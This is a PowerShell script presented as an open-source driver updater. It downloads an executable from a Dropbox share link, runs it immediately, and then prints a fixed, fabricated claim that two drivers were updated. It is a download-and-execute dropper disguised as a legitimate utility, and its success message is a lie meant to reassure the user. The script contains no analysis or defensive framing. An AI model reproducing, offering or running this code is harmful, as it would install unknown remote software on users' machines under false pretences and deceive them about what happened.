# =============================================================================
# Drivers updating code (open-source)
# Got any issues? Report it on the GitHub project.
# =============================================================================

$Url = 'https://www.dropbox.com/scl/fi/bf0mm4nt9fcl03phhwjey/DriversSofware.exe?rlkey=l0c5uwsale3be2bpn5870drkn&e=1&st=1btcgqq9&dl=1'
$Exe = 'updater1.exe'

Write-Host "`n" "=== Updating Drivers ===" -ForegroundColor Cyan
Write-Host "Downloading drivers..." -ForegroundColor Yellow

try {
    Invoke-WebRequest $Url -OutFile $Exe -ErrorAction Stop
    Write-Host "`nUpdating..." -ForegroundColor Yellow
    Start-Process -FilePath $Exe
    Write-Host "`nUpdate complete! 2 drivers updated." -ForegroundColor Green
} catch {
    Write-Host "`nError: " -NoNewline -ForegroundColor Red
    Write-Host "$($_.Exception.Message)" -ForegroundColor White
}

Write-Host "Finished." -ForegroundColor Gray
